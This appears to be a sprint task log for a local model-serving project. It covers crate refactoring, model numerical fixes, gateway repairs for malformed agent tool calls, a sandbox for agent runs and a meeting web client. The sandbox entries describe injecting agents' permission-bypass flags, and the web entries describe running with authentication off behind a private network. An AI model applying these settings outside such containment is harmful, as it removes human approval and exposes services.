  green, PoC smoke still green.
  **Building it found the gap that blocks EARLIEST — a THIRD upstream report, `tui-fetch-headers`:**
  the terminal target emits `ureq::get(url).call()` and drops the `headers` signal entirely, while
  every daemon route requires HTTP Basic → **the generated terminal client cannot read the live room
  at all**, never mind post. Why it hid: the upstream refresh gate AND our PoC both ran against
  fixtures with no auth — *a capability proven against a fixture is proven only for fixtures*. Our
  new fixture takes `--require-auth`, so when headers land, one flag turns the same script into the
  authenticated proof.
  Also learned, harmless once known: **`env()` resolves at emit time on the terminal target** (URL
  baked in as a Rust literal) **and at RUNTIME in the browser** — so the web client must take
  base/room from the page, and a web-side smoke can only assert the binding's presence; the
  behavioural assertion belongs to the terminal half.
  **CAVEAT on the green:** every emission was measured with `bin/ssc-tools` built from `ec70eb062`
  against a scalascript at `bb22c9d4b` (the CLI prints `STALE BUILD` each run). Re-confirm after
  `install.sh --dev` — I did not rebuild a staged toolchain other agents are using mid-flight.
  **AUTH REVISITED (operator asked whether Basic was really the answer — it was not).** The daemon
  now accepts `Authorization: Bearer <token>` alongside Basic (`150740c`, additive, both schemes
  resolve to the same handle/role, 401 advertises Bearer first). Basic meant base64 of `":" + token`
  and a `.ssc` view has no base64, so the client was being handed a PRE-BUILT header through its
  environment — the app doing the runtime's job with the least safe tool. Bearer also just names
  what already happened: the username field was always empty and the token always rode in the
  password.
  A **fourth upstream item** came out of the same question — `ui-fetch-credentials`, a design
  proposal rather than a defect: outbound credentials should be a DECLARED binding each target's
  runtime resolves, not a header string built in the view. The argument is one observation with
  teeth — `ssc run --v1` evaluates `env()` in the emitting process and the fetch URL is emitted as a
  Rust literal, so an app following the documented `{"Authorization": …}` pattern **compiles its
  token into the binary**. Nothing leaks today only because the terminal target drops headers; a
  naive `tui-fetch-headers` fix would cement the leak — hence the one request attached to it:
  resolve the header at FETCH time, not emit time. `clients/control/meetings.ssc` carries the
  warning meanwhile. `std.auth` does not cover this and should not: it is the vocabulary of BEING an
  auth server, with no notion of PRESENTING a credential outbound.
  NEXT: nothing in rozum is unblocked until upstream moves. Either wait on
  `tui-fetch-headers` → `tui-fetch-url-signal` → `tui-fetch-post`, or take one of them in
  scalascript directly (their POLICY.md claim protocol, `scripts/new-worktree`).
- [x] **ucc-control-api** — DONE: write actions fully wired. Meetings side DONE
  (`rozum-meeting::client` + `rest_read` HTTP). Models/gateway: `GET /control/status`
  (snapshot: residency + residents + installed catalog) + `POST /control/gateway/load`
  (ensure_gateway) + `POST /control/gateway/stop` (`8c64a47`, SIGTERM + ledger cleanup).
  UCC dashboard shows load/stop/resident state live. 90 gateway tests green.
- [x] **ucc-models-panel** — DONE: `8c64a47`. `POST /control/gateway/stop` added to control.rs
  (SIGTERM active gateway, 409 if clients attached). `modelsPanel` card in
  `control-center-live.ssc`: rowLink catalog picker (gwModel signal), "загрузить"
  (POST /gateway/load) + "остановить" (POST /gateway/stop) buttons, both refresh on
  completion. Inserted between residentsCard and catCard. 90/90 gateway tests green.
- Open: build-flag to select the frontend backend (not yet located); signal→redraw loop; focus/keyboard
  model (Tk-core vs tui-backend); Tk web-target ↔ existing SSR meeting server reconciliation. See spec.

### Workspace split — monolith → layered Cargo workspace (spec-gated, `docs/specs/workspace-split.md`)

Goal: decompose the single ~47K-LOC `rozum` crate into a **Cargo workspace of ~7–8
crates** along the dependency layers the code already has (core SPI → models/hardware/
engines → agent/gateway → meeting → bin), so each concern is its own crate with a
**compiler-enforced** boundary. One repo, one workspace (NOT separate repos). The
crate-level successor to the architecture-spi work below. **Behaviour-preserving and
green at every phase** — same binary, same features, same matrix. Decisions + the
dependency-graph evidence (prod graph is already a clean DAG; the wrong-way edges are
test-only) live in the spec.

- [x] **Workspace scaffold up** — root is now `[workspace] members = ["crates/*"]` (landed
  with Phase 1, since `rozum-meeting` has 0 internal deps and didn't need `rozum-core` first).
- [x] **Phase 0 — `rozum-core`** ✅. Moved the SPI cluster (`backend`/`concurrency`/`obs`/`engine`/
  `serving`/`sampler`/`constrain`/`harmony`) into `crates/rozum-core`; module names preserved +
  re-exported from `src/lib.rs` (`pub use rozum_core::{…}` + `pub(crate) use rozum_core::backend`)
  → consumers unchanged. Knot 1 handled (the `backend↔concurrency↔obs` trio stays co-located in
  core). **Knot — `backend→gguf` broken via inversion of control** (`25ea416`): the SPI registry no
  longer constructs the gguf engine; `backend::register_gguf_engine()` is a hook the binary fills at
  startup (`gguf::register_engine()` in `main()`), so core depends on **no** engine. `local-models`
  (the candle `CandleBackend`) now lives in `rozum-core` and the bin forwards its feature. **Deferred:**
  `config` stays in the bin (its `config→cascade` knot 2 is resolved when `cascade` moves in Phase 3).
  Verified: `cargo check` default **and** `--no-default-features` green; **82/82** core tests + **300/0**
  root lib tests pass (incl. orchestrator/gguf-registration path).
- [x] **Phase 1 — Extract `rozum-meeting`** ✅ (proof-of-concept; daemon has **0 internal deps**).
  meeting + clients (tui/web/discord/telegram) → `crates/rozum-meeting`; module names preserved
  so internal `crate::…` paths resolve unchanged + the `rozum` lib re-exports them under their
  original paths (near-zero churn in consumers). `cargo check` default **and**
  `--no-default-features` green; **71/71** crate tests pass; **no engine crate in its tree**
  (an engine edit no longer recompiles the daemon — the isolation win). `proxy`/`service` stayed
  in the bin (they need `concurrency`/`share` from `rozum-core`); they fold into `rozum-meeting`
  once Phase 0 lands.
- [x] **Phase 2 — `rozum-models` + engines** ✅ (`rozum-mlx`/`-gguf`/`-mistralrs`/`-x86`). `rozum-models`
  (catalog/sourcing/residency) extracted as a pure leaf (`c2f0bfa`). Each engine is its own crate with
  the **heavy dep gated behind the crate's own feature, forwarded from the bin** (`mlx-native =
  ["rozum-mlx/mlx-native"]`, etc. — "Approach B": engine crate always linked, heavy backend optional):
  `rozum-mistralrs` (`55c9347`), `rozum-x86` (`4aed2b5`), `rozum-gguf` (`cb4722b`, self-registers via the
  IoC hook), `rozum-mlx` (`96daf50`, + specdecode, + a `backend::*` glob since mlx uses SPI types at the
  crate root). Module names preserved + re-exported from `src/lib.rs` → consumers unchanged (the
  gateway→mlx telemetry refs resolve via mlx's always-compiled `mlx_memory_mb`/`batch_stats` fallbacks).
  Verified: `cargo check` default (mlx+gguf on, MLX C++ built) **and** `--no-default-features` green, plus
  `--features mistralrs`/`x86-native`; crate tests pass. **The isolation win is now real for engines:
  editing one engine recompiles only that crate, not the others or the daemon.**
- [x] **Phase 3 — `rozum-agent` + `rozum-gateway`** ✅. `share` moved to `rozum-core` (leaf util used
  by both + the bin). `rozum-agent` (agent/cascade/router/rag_lite/builtin_tools/memory_store/
  mcp_tool_source) — the intelligence layer, depends on core+models but **no engine** (118/118 tests).
  `rozum-gateway` (gateway/openai_http/anthropic_http) — the serving layer, **no engine** (71/71 tests).
  **Knot 3 fixed:** the gateway's MLX-telemetry reads are now a `rozum-core::obs` registration hook
  (`register_mlx_memory`/`register_mlx_batch_stats` + `BatchStats`); `rozum-mlx::register_telemetry()`
  fills it in `main()`, the gateway reads via `crate::obs` → it no longer references the engine.
  **Knot 4 fixed:** the 3 real-MLX `#[ignore]` evals (agent/router/rag) relocated to the bin's
  `tests/mlx_evals.rs` (the only place agent-loop legitimately meets a concrete engine), so rozum-agent
  has zero mlx reference. **Knot 2 dissolved:** `config` stays in the bin (top), so `config→cascade`
  is bin→agent — no inversion, no type move needed. (`POISON_ENV_LOCK` made `pub`+non-cfg(test) so the
  bin's proxy tests reach it cross-crate.) Verified: `cargo check` default (mlx on) + `--no-default-features`
  green; all test targets compile under default features. **The bin is now just the launch/CLI layer**
  (main/config/doctor/proxy/sandbox/service).

### Architecture legibility — SPI boundaries (spec-gated, `docs/specs/architecture-spi.md`)

Goal: make rozum's extension points legible — a reader finds the seam for any
concern (model / tool / agent / service) in one hop. NOT "plugin-ize everything":
two axes are already SPIs, one tangle is worth extracting, services stay as-is.
Each step is **behaviour-preserving** and **matrix-gated**. **Stages 1–3 DONE +
merged** (the legibility goal is met). Spec `2edbf00`; outcome in
`docs/specs/architecture-spi.md` Results.

- [x] **Stage 1 — Document** (merged `2b0a135`). `SPEC.md` "Extension points" names
  the four axes (`ChatBackend`/`ToolSource` SPIs ✓, the two seams, services).
- [x] **Stage 2 — Extract `ToolDialect`** (merged `023c121`). `dialect_for(template)`
  → `Qwen`/`Harmony`/`Glm`; render + constraint-envelope flag flow through it.
  Behaviour-preserving: 448/0 lib tests + Qwen3.6-35B claude×fix smoke pass=1.
  **Scope correction:** parse stayed a generic union (`parse_tool_calls`), not
  per-family — the dialect owns only what varies (render + envelope).
- [x] **Stage 3 — `WireProtocol`: MAPPED, trait rejected** (merged `2fc0ed9`).
  Investigated; the gateway wire layer is *already factored* (named per-dialect
  parse + serialize fns + thin handlers converging on `ChatRequest`/`ChatEvent`).
  A trait would force uniformity over different typed extractors + SSE sequences →
  net-negative on matrix-critical code. Fixed the stale module doc ("two dialects" →
  three) into an accurate wire-protocol **map**. Docs-only.
- [x] **Stage 4 — MCP `ToolSource` adapter** (merged). `McpToolSource`
  (`src/mcp_tool_source.rs`): rmcp 1.7 client over a stdio child process; tools cached
  at connect, `dispatch`→`call_tool` with `is_error`/transport failures → recoverable
  `ToolError`; composes with in-process tools via `MultiToolSource`. **5/0 tests** via an
  in-memory duplex against a minimal in-process rmcp server (`echo`+`boom`) — no external
  binary. Spec `docs/specs/mcp-toolsource.md`. (Surfacing it in an embedded-agent command
  that *configures* MCP servers is a separate later step — out of scope here.)
- [x] **Out of scope (decided):** services-as-plugins (subcommands stay); dynamic/
  loadable plugins (dylib/WASM/out-of-process) — in-tree trait impls only;
  re-abstracting `ChatBackend`/`ToolSource` (already correct).

### Top priority (P0): mistralrs Qwen3.6 finish-the-forward — RESOLVED (day 6)

**Root cause found and fixed.** The residual divergence was NOT the
weight-row-ordering hypothesis from days 1-5. It was the **RMSNorm `+1`
convention**: `GemmaRmsNorm::new` bakes `weight = on_disk_weight + 1.0`, but
the sanitized `mlx-community/Qwen3.6-35B-A3B-4bit` checkpoint uses raw
RMSNorm weights (MLX's `should_shift_norm_weights` is False for sanitized
checkpoints: conv1d `(8192,4,1)`, no MTP). The `+1` over-scaled every norm
(~2.1x) and the silu MoE compounded it to a ~14x experts blow-up + an
over-peaked router. Fix: `GemmaRmsNorm::new_unshifted` for the five norm
sites in `vision_models/qwen3_5_moe/text.rs`.

Full writeup + the one-pass diagnostic methodology that localized it:
`docs/specs/mlx-weight-layout-and-afq.md` section 13. Oracle:
`scripts/mlx_ref.py` (--layers/--attn/--mlp/--router) +
`scripts/mlx_ref.qwen36-hello.txt`. Patch:
`patches/mistralrs-qwen36-afq-wip.patch`.

- [x] qwen36-fullattention-split - VERIFIED ALREADY CORRECT (red herring).
  - `qwen3_5_moe/text.rs` FullAttention already loads separate
    `q_proj/k_proj/v_proj` AFQ layers and its gate-interleave split matches
    `mlx_lm/models/qwen3_next.py::Qwen3NextAttention` exactly. Confirmed
    byte-for-byte: layer-3 (first FullAttention) `||x||` 1.4432 vs Python
    1.4460 once the RMSNorm fix is in. No layout change was needed.

- [x] qwen36-moe-switchmlp-layout - VERIFIED ALREADY CORRECT (red herring).
  - The MLX checkpoint ships experts **pre-fused** as
    `switch_mlp.{gate,up,down}_proj` `(num_experts, out, in)` (no per-expert
    `experts.<i>`). On Metal the `MoEExperts` Fast path -> quant
    `FusedExperts::new` loads them via `AfqLayer::afq_packed_linear_b` and
    the forward applies router weights correctly. The 14x magnitude was the
    RMSNorm bug feeding a 10x input, not a layout/dequant error. Confirmed:
    layer-0 per-expert outputs now match Python's `[0.78,0.25,0.57,...]`.

- [x] qwen36-numerical-parity-gate - PASSED.
  - `"Hello"` (11 tokens) renders identically in both runs; embedding
    byte-for-byte; all 40 layer last-position `||x||` match within bf16
    rounding; top-1 logit `id=8160 'Here' logit=22.0` identical to `mlx_lm`.
    Greedy generation begins identically.
  - Remaining (follow-up, not blocking): thread the fix into the upstream PR
    (`docs/specs/mistralrs-qwen36-pr.md`) and decide whether rozum's
    crates.io `mistralrs` 0.8.1 dep gets a `[patch]` to `.vendor/mistral-rs`
    or waits for an upstream release. NOTE: rozum currently has NO `[patch]`,
    so the fix lives only in `.vendor` + `patches/` until that is wired —
    `rozum`'s own binary still loads unpatched 0.8.1 and Qwen3.6 should keep
    routing through the LM Studio HTTP backend until then.

### Active

#### codex×gpt-oss gateway reliability (2026-06-21) — agentic matrix 22/30 → 27/30

Five OUR-bugs found+fixed in `src/gateway.rs` via the `isolate` skill (agent-bisection:
same gpt-oss, codex fails / opencode+claude pass → look at the codex path, not the model).
Full writeup [[project-gateway-patch-revert]]; specs `docs/specs/apply-patch-*`,
`loopbreak-edit-churn`, `patch-fuzz-tunable`.

- [x] apply-patch-idempotent — `patch -p0 --fuzz=3 -N --forward`: re-sending an already-applied
  patch was REVERTING the fix (no-tty "Assume -R?"). Coin-flip pass → deterministic. `f63d583`.
- [x] loopbreak-edit-churn — `detect_stuck_loop` signature 3: ping-pong edit-churn (≥3 edits to one
  file + a re-added removed line, or ≥6). Killed all 300s timeouts; opencode×gpt-oss 1/5→5/5. `c134334`.
- [x] apply-patch-fn-decode — the apply_patch FUNCTION-call reroute (gpt-oss's dominant shape) didn't
  decode `\uXXXX` → `collect::<String>()` landed as `collect::<String>()`. `14fe6c8`.
- [x] read-repair-default-on — gpt-oss emits broken `sed -n "src/main.rs"` → never reads → never fixes;
  the existing repair was gated off. Default-on + refined to only fire on broken reads. `14fe6c8`.
- [x] apply-patch-ws-fallback — gpt-oss drops the leading indent on changed lines; BSD `patch` (even
  `--ignore-whitespace`) can't match → `.rej`, fix lost (looked like a "revert"). Static python reads
  the `.rej`, matches by trimmed content, re-applies preserving indent. codex×gpt-oss×fix ~1-2/5→5/6. `6f2bed9`.
- [x] codex×gpt-oss build/test (create-from-scratch) — **DONE 2026-06-22: gateway-fixable, NOT a model
  limit** (the "model limit" verdict was reached without capturing the tool calls). `ROZUM_CODEX_TOOL_
  CAPTURE=1` on a real codex×gpt-oss build run showed **10/11 calls are one malformed shape**:
  `exec_command` args = `{cmd:"apply_patch", path, content}` (dup `cmd` key) — a **write-intent shoved
  into exec_command**. The `content` is a VALID Cargo.toml; exec_command only runs `{cmd:"<shell>"}`, so
  codex executed `apply_patch` as a bare command and dropped `path`/`content` → file never lands → build
  loops to timeout (rc=143), test fails. **FIX (landed):** `normalize_codex_tool_args` now detects a bare
  `apply_patch` carrying a non-patch `{path, content}` and synthesizes the real write — `mkdir -p
  "$(dirname '<path>')"; cat > '<path>' <<'ROZUM_WRITE_EOF'…ROZUM_WRITE_EOF` (single-quoted heredoc →
  verbatim body). Patch-content still folds to `patch --fuzz`; path-only untouched. Unit + shell-e2e
  validated; full model matrix cell deferred behind a concurrent GLM-4-32B run holding RAM (expected
  3/5 → 5/5). Spec `docs/specs/codex-create-write-synth.md`; Finding 5 in `docs/matrix-failure-analysis.md`.
- [x] **gptoss-v4a-isolate** — DONE 2026-06-22 (Finding 6). gpt-oss IS V4A-competent (5/5 clean, text+toolcall, multi-file); adherence COLLAPSES under codex's 21KB+18-tool load (5/5→2/5 with filler) — invents JSON / drops `*** Begin Patch`. 35B robust (minimal reasoning). Fix: codex-lean (shipped, explains why) + trim codex prompt + steer to simple primitive + prefer 35B for codex. — WHY does gpt-oss specifically struggle with codex's V4A `apply_patch`
  protocol, when 35B clears it and gpt-oss creates files fine under claude/opencode? Use the `isolate`
  skill (model-only probe, no agent): send a CLEAN minimal V4A create request straight to the gateway
  `/v1/chat/completions` for gpt-oss AND 35B (control); count shapes; prove model-V4A-competence vs
  codex-interface-degradation. Questions: (a) can gpt-oss produce a syntactically valid V4A patch at
  all? (b) is V4A out-of-distribution for gpt-oss's harmony training? (c) does the failure scale with
  prompt size / tool count (codex's 21KB/18-tool overload)? Writeup → `docs/matrix-failure-analysis.md`;
  feeds the Finding-5 solution (system-prompt steering to one simple create primitive).

#### Agentic-matrix model problems (catalog, 2026-06-21) — per-model failures + their cause

Consolidated from the agentic matrix (`scripts/bench/agentic.sh`, sandbox on). Reminder:
`verify_task` scores by **final file state**, not rc. Gold standard: **Qwen3.6-35B-A3B = 15/15**
(claude/codex/opencode), the agentic pick; **Qwen3-30B-A3B** close behind. Per-model issues:

- [~] **gpt-oss-20b** — claude **5/5**; codex/opencode the residual.
  - `fix`/`debug` (edit-existing): RESOLVED — five gateway delivery bugs (revert, churn, `\uXXXX`
    decode, read-repair-off, whitespace-`.rej` fallback), see the `codex×gpt-oss gateway reliability`
    entry above. codex×gpt-oss×fix ~1-2/5 → 5/6.
  - `build`/`test` (create-from-scratch): the dominant residual — gpt-oss can't scaffold via codex's
    `apply_patch` (`patch` can't create → `Oops.rej`; model flails `cat`/`tee`/`apply_patch`, stacks
    duplicate `[package]`, never reaches `src/main.rs`). Being addressed by `codex-create-write-synth`
    (apply_patch `{path,content}` → synthesize a `cat >` write). REASONING model → must sample (temp~1.0),
    greedy loops its CoT.
- [x] **GLM-4-32B-0414** (new MLX-native port, byte-parity) — agentic matrix **4/15**. Symptom: in
  agent runs it **narrates tool use in markdown** (` ```zsh\ncat src/main.rs\n``` ` / ` ```bash\nRead\n{json}\n``` `,
  + ` ```prose\n…\n``` `, repeating blocks) instead of emitting a structured call → not parsed → not
  executed. **ROOT CAUSE ISOLATED (`isolate` skill — my first read "GLM is a weak driver / model
  characteristic, unfixable" was PREMATURE and WRONG):**
  - **Model-only probes (direct gateway, clean prompts): GLM emits PERFECTLY STRUCTURED calls** — single
    tool (`read_file {"path":…}`), claude's 4-tool set (`Read {"file_path":…}`), codex shell-framing
    (`shell {"command":["cat",…]}`), AND the Anthropic `/v1/messages` endpoint. So GLM is fully capable.
  - **Trigger reproduced deterministically:** add a big system prompt that instructs "explain in prose +
    use markdown before each tool call" (exactly what the agent CLIs do) → GLM returns
    ` ```prose\nI'm going to read…\n``` ` markdown narration, NO structured call. GLM **faithfully follows
    the narrate-in-markdown instruction**, which conflicts with structured tool-calling.
  - **Control:** Qwen3.6-35B is 15/15 under the SAME agent prompts → far less susceptible. So GLM-4-0414
    over-weights the narration framing vs the structured-call format. A model trait, but **prompt-triggered
    and FIXABLE**, not "inherently can't".
  - claude **2/5** (greet+fix): when GLM happens to wrap a clean `Name\n{json}` in a fence, the new
    `parse_glm_tool_call` fenced parser (serving.rs) catches it. Also a leak to fix: the parsed tool-call
    text is ALSO returned as a content/text block (Anthropic path returns both text + tool_use).
  - **FIX TRIED — (b) prompt-override REGRESSED, discarded.** Injected a strong last-word system
    instruction ("call a tool = ONLY name\\nJSON, no prose/markdown/fences") for GLM+tools. Isolated
    probe passed (big narration prompt → structured). But the real agent run **regressed claude
    fix 1→0**: the override worked partially — GLM *dropped the markdown fence* but kept a lead-in prose
    line → `prose\\nRead\\n{json}` (bare, un-fenced, embedded) → the fenced parser (which had been
    catching the ` ```bash\\nRead\\n{json}\\n``` ` form) now misses it. And codex still emitted ` ```zsh\\n<raw
    shell>\\n``` ` (not `shell\\n{json}`), so the override didn't reach/fix the responses path. A second
    "passed in isolation, regressed in the full multi-turn/multi-endpoint system" case (skill-recorded).
  - **FIX (a) SHIPPED — logit-constrained GLM tool calls (master `99c6081`).** Taught the masked
    decoder GLM's `name\\n{bare_args}` envelope: `find_glm_tool_call` anchors on the last line that is
    exactly a known tool name + `\\n`, then forces the args to that tool's JSON schema; a pure-prose
    answer (no tool-name line) stays free so the final-answer turn survives. Plus an embedded parser
    (`glm_embedded`) + `tool_markup_at` suppression. **Proven on the LIVE matrix** (not an isolated
    probe — the override's lesson): it fires and every call is schema-valid (claude×fix `Read`/`Edit`/
    `Bash` clean → **pass=1, no regression**; claude×debug calls clean). 449/0 lib tests.
  - **But the matrix score did NOT lift — and the reason is a _different_ gap, read from the kept
    transcripts (no premature verdict).** build/test/codex fail because GLM emits the **artifact
    directly** — Cargo.toml/main.rs *content* inside ```toml/```rust fences, or raw `cat`/```bash —
    instead of ever *naming* `Write`/`shell` (claude×test: tools=0; codex: raw shell). No tool-name
    line ⇒ no anchor ⇒ nothing for any output-format constraint to force. So **GLM-4-32B-0414 has a
    tool-use _decision_ gap, not a _format_ gap**: when it names a tool the call is now clean; for
    file-creation/shell it *shows* the artifact rather than *naming* the tool (a tuning property),
    fixable only model-side (a tool-calling-tuned GLM variant) or by intent-forcing that breaks the
    final-answer turn. debug = a 3rd axis (clean calls, driver loops → RUN_TIMEOUT).
  - **DECISION-NUDGE TRIED → DISCARDED (net-negative).** A positive few-shot in the GLM render
    ("you are an agent, call tools, don't print artifacts"; `ROZUM_GLM_TOOLUSE_NUDGE`). Live A/B on
    the same binary: it **proves the decision gap is prompt-MOVABLE** — GLM named `Write` for the first
    file in test where it never had — but it is **not a reliable lever**: it *reliably regressed the
    one stable cell* (nudge-OFF claude×fix = 1, 2/2 runs; nudge-ON = 0 — GLM read, described the fix in
    prose, and stopped without the Edit) and induced a new failure (args object emitted with NO tool
    name → no anchor). Discarded.
  - **META-finding: the 5-task matrix is too NOISY for small agentic deltas.** Control exposed it —
    claude×test flipped **0↔1 across two nudge-OFF runs of the same config**. So ±1-cell single-run
    deltas on these toy tasks are variance, not signal; only a *reliably* reproduced shift (like the
    fix regression, or a multi-run mean) counts. Don't read a single matrix run as a verdict.
  - **Verdict:** GLM-4 ships in `EXTRA` as a parity-exact chat/code model with **hardened tool-calling
    when invoked** (schema-valid args, no drift, default-on). The agentic-driver ceiling is a tool-use
    DECISION gap (GLM *shows* artifacts vs *names* Write/shell) — **prompt-movable but not
    prompt-fixable**; the robust fix is model-side (a tool-calling-tuned GLM variant). Qwen3.6-35B
    (15/15) remains the agentic driver; GLM-4 is the chat/code model. Spec `docs/specs/glm4-bringup.md`.
- [x] **Qwen2.5-Coder-7B / Qwen3-4B** — original 2026-06-19 verdict: below the **~27B agentic cliff**
  and unreliable on multi-step tool loops. **Updated 2026-06-29:** after lean/headless repair hardening
  and artifact synth fixes, both have targeted green evidence beyond the old 2/5-ish ceiling
  (Qwen2.5-Coder-7B: `build/test/fix/debug/rpn`; Qwen3-4B: `build/fix/test/debug/rpn`). Still do not
  surface as default agentic picks until multi-rep confirms stability; Qwen3-4B `rpn` is green but slow
  (277s, 22 turns).

#### model-sandbox (2026-06-19, operator-driven) — structural jail for agentic model runs

**Goal (operator):** the models rozum hosts run agentic loops that touch the FS + shell; they must
be **structurally** unable to do harm **without a stream of per-action approval prompts** — free
inside an allowed path-set, denied outside by the OS, no asking. Spec: `docs/specs/model-sandbox.md`.
Two enforcement backends over one `(path,mode)` policy: macOS Seatbelt (default) and Docker (opt-in,
any OS). `ROZUM_SANDBOX=0` opts out; `--no-sandbox` is the launch-flag sugar.

- [x] **P1 — Seatbelt MVP (DONE 2026-06-19).** `src/sandbox.rs` `SandboxPolicy`/`rust_coding`/
      `to_seatbelt_profile`; `rozum launch` jails every agent (all exec paths via `sandboxed_command`).
      ON by default on macOS, secrets denied read+write, agent-state dirs writable. Validated on M4
      (cargo build in-jail succeeds, escape denied) + real matrix cell.
- [x] **`--no-sandbox` flag (DONE 2026-06-20, `56e4a03`).** CLI sugar over `ROZUM_SANDBOX=0`; hoisted
      by `reorder_launch_args`; left for the child after `--`.
- [x] **P3 — Docker backend (DONE 2026-06-20, `95d2814`).** `ROZUM_SANDBOX_BACKEND=docker` renders the
      same policy to `docker run` (bind mounts + tmpfs-masked secrets + `host.docker.internal` gateway
      + env allowlist). Validated: unit tests + real `docker run` e2e + full `rozum launch` run.
- [x] **rozum-agent image (DONE 2026-06-20, `ba1bb80`).** `docker/rozum-agent.Dockerfile` +
      `scripts/build-agent-image.sh` (rust + git + node + claude/codex/opencode). Validated: a real
      `cargo build` runs inside the container jail via `rozum launch`.
- [x] **sandbox-docker-resource-limits — DONE 2026-06-20.** `--memory`/`--cpus`/`--pids-limit` via
      `ROZUM_SANDBOX_DOCKER_{MEMORY,CPUS,PIDS}` (memory/cpus opt-in; pids default 2048 fork-bomb guard).
      `DockerLimits{none,from_env}` + render; verified on M4: 64 MB cap OOM-kills (rc 137), pids cap
      fails forks past the limit, normal builds unaffected. Also added `wget` to the rozum-agent image.
- [x] **sandbox-network-policy-knob — DONE 2026-06-20.** `ROZUM_SANDBOX_NETWORK`
      (`none`|`gateway-only` (default)|`full`) via `NetPolicy::from_env()`, honored by BOTH backends
      (`sandboxed_command` no longer hard-codes `GatewayOnly`). Verified via `rozum launch`:
      `none`→gateway BLOCKED (true zero-egress), `gateway-only`→REACHED. Unit test on the parse/aliases.
- [x] **sandbox-docker-strict-egress — DONE 2026-06-20.** `ROZUM_SANDBOX_NETWORK=gateway-strict`
      (`NetPolicy::GatewayStrict`) = true gateway-only-no-internet. Docker has no egress-allowlist flag
      (`--internal` kills the host too), so it's enforced IN the container: `--cap-add=NET_ADMIN` +
      `ROZUM_EGRESS=strict` → the `rozum-agent` entrypoint installs an iptables allowlist (lo +
      established + resolved host-gateway, DROP rest incl. IPv6; fails loud exit 70 if unenforceable).
      Seatbelt = `gateway-only` (already loopback-only). **Verified on M4 via `rozum launch`:** gateway
      REACHED, internet BLOCKED; `gateway-only` control reaches both.
- [x] **sandbox-docker-opencode-config — DONE 2026-06-20.** `write_opencode_config` now writes under
      canonical `/tmp` (a toolchain bind mount) instead of `$TMPDIR` (not shared by Docker Desktop), so
      the file is visible in the container at `OPENCODE_CONFIG` (verified in the `rozum-agent` image).
      Regression test `opencode_config_lives_under_tmp_so_docker_mounts_it`.
- [x] **sandbox-no-approval-autonomy — DONE 2026-06-20.** The "No-noise principle": when jailed,
      `rozum launch` injects the agent's approval-bypass flag for HEADLESS launches (`claude -p` →
      `--dangerously-skip-permissions`, `codex exec` → `--dangerously-bypass-approvals-and-sandbox`,
      `opencode run` → `--dangerously-skip-permissions`) — sandboxed models act with no per-action
      prompts (kills the codex reject-escalation loop, Finding 1a). Gated: jailed-only, headless-only,
      never overrides an explicit policy. Pure `autonomy_flag_for` (2 tests) + e2e-verified.
- [x] **sandbox-config-table — DONE 2026-06-20.** A `[sandbox]` table in `rozum.toml` (`SandboxConfig`):
      `workspace` (extra rw), `read_only` (Docker `:ro` mounts), `secret_deny` (extra denies),
      `network`, `backend`. Loaded in `sandboxed_command`, merged via `SandboxPolicy::rust_coding_with`;
      **env overrides config**. Config-parse + read-only + `rust_coding_with` tests + live smoke. **The
      model-sandbox track is now complete** (only the optional P2 Linux Landlock/bubblewrap remains).

#### meeting-web-pwa-ssc (2026-06-19, operator-driven) — phone-installable meeting client, then re-author in .ssc→Rust

**Goal:** a polished meeting web the operator opens + installs on their phone over the mesh,
then re-authored in ScalaScript that **compiles to Rust** and works with the rozum daemon.
Part of demo-conference (`docs/specs/demo-conference.md`); this is the meeting-web-PWA half of
the split (sibling owns the model-participant bridge). Worktree `feature/meeting-web-pwa-ssc`
(off rozum at `../rozum-meeting-pwa`). ScalaScript toolkit-on-Rust (the foundation) lives in
`../scalascript` (branch feature/rust-web-toolkit): vstack/heading/text/lower/serve→SSR, named
args, signals (data-ssc-*), server-push (/__ssc/push|state) — all shipped + green.

**STATUS 2026-06-23: the .ssc rewrite IS the shipped, only meeting web — the hand-written
`web.rs`/`web_index.html`/`meetings web` subcommand were removed. Source: `clients/meeting/meeting.ssc`
on `feature/meeting-web-pwa-ssc` (worktree `../rozum-meeting-pwa`); launchd `com.rozum.meeting-ssc`
:8405 behind Tailscale `:8443`/`:8446`. (Code is safe in the worktree; this shared-master SPRINT.md
is churned by sibling agents — feature tasks also tracked in `clients/meeting/TASKS.md`.)**

Done since the rewrite: rich text (inline `code`, `**bold**`, clickable links, done/working/blocked
badges, per-day date dividers, `HH:MM`, per-handle colour), trim-80, chronological `.sorted`,
auto-scroll, active-participants bar; content-integrity fix (quote truncation). **Dynamic rooms**:
`/r/<room>` for ANY room via http **prefix routing** (toolkit runtime) + `<select>` switcher.
**`/manage` panel** (⚙): rooms list/switch/create/delete + **bulk "clean empty rooms"** (19→8 junk
ghosts pruned; project rooms protected), models list/`rm`, gateway status/switch/stop/unload,
model-participant start/stop, agents view. Room reads are hardened: project rooms resolve from
`rozum meetings status` → `<project>/.rozum/room`, global rooms honor `$XDG_STATE_HOME`/`$HOME`.
Toolkit additions landed in
`feature/rust-web-toolkit`: `&str` patterns (contains/split/join/replace), Vec
`.take/.drop/.takeRight/.dropRight/.sorted/.distinct`, `String.toList→.chars()`, `.sum`, http
`no-store` + MIME-by-extension + prefix routing.

- [x] **Gateway control in `/manage` — DONE 2026-06-23.** `rozum gateway` HAS `status`
      (model/port/pid/uptime/clients), `switch --model <spec>` (clean drain→swap), `stop`/`unload`.
      The `.ssc` management panel now shows active model/status, switches per installed model, and
      exposes stop/unload. Makes "manage models/agents" real. (Launching interactive agents via
      `rozum launch` stays CLI — a TTY program
      isn't a web button.)

- [x] **Installable PWA** (`c368774`) — apple-mobile-web-app meta + web manifest + service worker +
      SVG icon; routes `/manifest.webmanifest`, `/sw.js`, `/icon.svg` in `src/meeting/web.rs`. iOS
      Add-to-Home-Screen runs full-screen.
- [x] **Reachable from the phone over Tailscale** — busi runs tailscaled userspace
      (`~/.busi/tailscale`); `tailscale serve --bg --https=8443 → 127.0.0.1:8400` (HTTPS is REQUIRED
      for the SW's secure context). The operator's iPhone (on the tailnet) opens
      `https://busi.tail1174e2.ts.net:8443/`. busi's own `/`→:8088 untouched.
- [x] **No-auth mode for a network-gated front** (`c368774`) — `ROZUM_WEB_NO_AUTH=1` (empty secret ⇒
      `auth_layer` lets all in). Tailscale already gates the tailnet; the Basic-auth dialog was
      re-prompting on iOS and blocking entry.
- [x] **Persistent service** — `~/Library/LaunchAgents/com.rozum.meeting-web.plist` (RunAtLoad +
      KeepAlive; `--room demo --bind 0.0.0.0 --port 8400`, NO_AUTH). Survives session-end + reboot.
